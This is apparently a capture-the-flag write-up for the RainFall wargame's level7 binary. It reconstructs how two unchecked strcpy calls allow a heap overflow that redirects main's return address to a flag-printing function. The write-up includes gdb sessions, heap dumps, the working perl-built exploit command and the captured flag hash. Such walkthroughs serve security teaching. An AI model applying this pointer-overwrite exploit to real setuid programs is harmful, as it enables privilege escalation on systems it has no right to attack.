# level4

Pull the executable:

```sh
sshpass -f ../level6/flag scp level7@rainfall:level7 .
```

See `source.c` for source reconstitution.

This one is weird.  4 calls to `malloc(3)`, 2 calls to `strcpy(3)`, some pointer juggling, the flag file open in read mode and a random `puts("~~")` at the end.

First, about the pointer gymnastics.  From what we can see the second and fourth buffers are only stored on the stack as temporary variables.  They find their way into the first and third buffers shortly after being allocated.

Then, about `strcpy(3)`.  They take `argv[1]` and `argv[2]` as input so they are vulnerable.  They copy data into the second and fourth buffers.

`fopen(3)` definitely uses `malloc(3)` under the hood, so it may be possible to alter the properties of the file handle although that may be useless for us right now.

The attack surface is assuredly both `strpcy(3)` calls.  Maybe we will need to do some heap shenanigans.

After a little more digging, there is also a function `m` that appears to be the win path since it prints `c` which is the read buffer for `fgets(3)`.  We will definitely need to do some stack wizardry.

Here's a quick idea:

Use the first `strcpy(3)` to modify the contents in the second buffer so that it points to the return address of `main`, then use the second `strcpy(3)` to write the address of `m` (`0x80484f4`). By the time `main` returns, the flag file is already read into the buffer `c` so `m` should print its content along with the current time (why?).

```sh
gdb ./level7

b *main+21
b *main+47
b *main+68
b *main+94

r "hello" "world"

p/x $eax
# -> 0x804a008
c

p/x $eax
# -> 0x804a018
c

p/x $eax
# -> 0x804a028
c

p/x $eax
# -> 0x804a038
c
```

Same as the previous level, each heap data block also is also prefixed with 8 bytes of metadata.  We can verify the address of the heap:

```sh
b main
r
info proc mappings
```

This gives:

```
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

To make our life a little easier, we can dump the heap:

```sh
# x     examine
# /     start examine option
# 16    show 16 elements
# w     elements are words (32 bits on x86)
# x     hexadecimal

# just before first strcpy
b *main+127
r
x/16wx 0x804a000
```

We get:

```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
```

We can deduce that the first two elements of each row are heap metadata, and the last two elements are the writable memory returned by `malloc(3)`.  The first call to `strcpy(3)` writes to `*(0x0804a008 + 4) = *(0x0804a00c) = 0x0804a018`, which is also the address of the second buffer.  As seen in the heap dump, overflowing any of the buffers will overwrite the next buffers.  The second call to `strcpy(3)` writes to `*(0x0804a028 + 4) = *(0x0804a02c)` which, *for now*, is `0x0804a038`.  Since changing `*(0x0804a02c)` is possible, we should be able to make the second `strcpy(3)` call write to basically anywhere we want.  The next logical step is to try to override the return address of `main` to `m`.  Our working surface starts at `0x0804a018`, so let's show it:

```sh
x/10wx 0x0804a018
```

It gives:

```
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x00000000      0x00000000
```

Our target is the 6th word with value `0x0804a038`.  One slight issue it that we cannot put NUL bytes in our arguments, otherwise `strcpy(3)` will stop without consuming our whole argument.  This will probably mess with heap metadata, but let's worry about that later.

Since we are working with command line arguments, let's write a command to print `argv`.  We know that `ebp` is the pointer to the current stack frame base.  If we dereference that pointer, we get the pointer to the previous stack frame base.  `ebp - 4` is the address of the saved `eip`.  We also know that the arguments of the current function are before `ebp` and `eip`, so `ebp - 8` is argument 1, `ebp - 12` is argument 2, etc..  We are in `main`, which has `argc` and `argv` as arguments.  `argc` is `ebp - 8`, `argv` is `ebp - 12`.  We can verify that like so:

```sh
b main
r "snow-crash" "rainfall" "override"
p/x *(int *)($ebp + 8)
p/s **(char ***)($ebp + 12)
x/4s **(char ***)($ebp + 12)
```

```
4

"/home/user/level7/level7"

0xbfffffad:	 "/home/user/level7/level7"
0xbfffffc6:	 "snow-crash"
0xbfffffd1:	 "rainfall"
0xbfffffda:	 "override"
```

It seems that it's not possible to use `x` (or `p` with `'*@'` notation for that matter) with non-integral values in this version of GDB, so we will have to enter the array size manually.  That shouldn't be a problem since we only pass `argv[1]` and `argv[2]`.

Now that we know how many bytes we need to write in each arguments, we should get stack addresses now because arguments and environment (among other things) also live on the stack.  We can prove this like so:

```sh
b main
r "foo" "fooooooooo" "foooooooooooooooooooo"
p/x *(int *)($ebp + 8)
p/s **(char ***)($ebp + 12)
x/4s **(char ***)($ebp + 12)
```

We get different addresses:

```
0xbfffffa5:	 "/home/user/level7/level7"
0xbfffffbe:	 "foo"
0xbfffffc2:	 "fooooooooo"
0xbfffffcd:	 "f", 'o' <repeats 20 times>
```

But if we provide the same amount of bytes (character and argument counts):

```sh
r "bar" "baaaaaaaar" "baaaaaaaaaaaaaaaaaaar"
p/x *(int *)($ebp + 8)
p/s **(char ***)($ebp + 12)
x/4s **(char ***)($ebp + 12)
c
```

We get the same addresses:

```
0xbfffffa5:	 "/home/user/level7/level7"
0xbfffffbe:	 "bar"
0xbfffffc2:	 "baaaaaaaar"
0xbfffffcd:	 "b", 'a' <repeats 19 times>, "r"
```

Let's forge simple arguments that do what we want.  We must have two arguments.  The first must be 24 bytes.  The second must be 4 bytes.  They must not contain NUL bytes, except for string termination.

```sh
# right after first strcpy
b *main+132
r "AAAABBBBCCCCDDDDEEEEFFFF" "ZZZZ"
x/4s **(char ***)($ebp + 12)
x/16wx 0x804a000
```

Our heap looks like that:

```
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x42424242
0x804a020:      0x43434343      0x44444444      0x45454545      0x46464646
0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
```

And our argument addresses:

```
0xbfffffac:      "/home/user/level7/level7"
0xbfffffc5:      "AAAABBBBCCCCDDDDEEEEFFFF"
0xbfffffde:      "ZZZZ"
0xbfffffe3:      "/home/user/level7/level7"
```

We have successfuly overwriten the target address.  Let's continue.  The execution stops with a segmentation fault:

```
Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f52 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

By inspecting the call stack, we can see that the second `strcpy(3)` call is responsible for the crash: it tried to write at address `0x46464646`.  We're getting closer.

Now, to grab the stack addresses:

```sh
# stack frame of main
info frame 1
```

It prints:

```
Stack frame at 0xbffffe40:
 eip = 0x80485c2 in main; saved eip 0xb7e454d3
 caller of frame at 0xbffffe10
 Arglist at 0xbffffe38, args:
 Locals at 0xbffffe38, Previous frame's sp is 0xbffffe40
 Saved registers:
  ebp at 0xbffffe38, eip at 0xbffffe3c
```

The last lign is what we want: previous stack base `ebp` is stored at `0xbffffe38` and previous instruction pointer `eip` is stored at `0xbffffe3c`.

```sh
r "$(perl -e 'print "AAAABBBBCCCCDDDDEEEE", pack("L<", 0xbffffe3c)')" "$(perl -e 'print pack("L<", 0xffffffff)')"
```

We get:

```
Program received signal SIGSEGV, Segmentation fault.
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
```

That's not good.  We wanted the program to crash at address `0xffffffff`, not at some random place in `fgets(3)`.  `fopen(3)` returned NULL and `errno` indicates error 13 which is `Permission denied`.  This makes perfect sense: since the program is executed in GDB, the setsuid/setgid bits are not taken into account.  We are effectively running the program as user `level7`, not `level8`.  For now we will simply skip `gets(3)` by setting `eip` to a later address:

```sh
b *main+202
r
set $eip = *main+207
c
```

We get:

```
Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0xffffffff
```

That's more like it.  Let's replace `0xffffffff` with the correct address:

```sh
b m
r "$(perl -e 'print "AAAABBBBCCCCDDDDEEEE", pack("L<", 0xbffffe3c)')" "$(perl -e 'print pack("L<", 0x80484f4)')"
set $eip = *main+207
c
```

The execution stops at `m`.  It worked!  Now, we should be able to run this outside of GDB and get the flag:

```sh
env -i ~/level7 "$(perl -e 'print "AAAABBBBCCCCDDDDEEEE", pack("L<", 0xbffffe3c)')" "$(perl -e 'print pack("L<", 0x80484f4)')"
```

We get:

```
~~
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1773753356
Segmentation fault (core dumped)
```
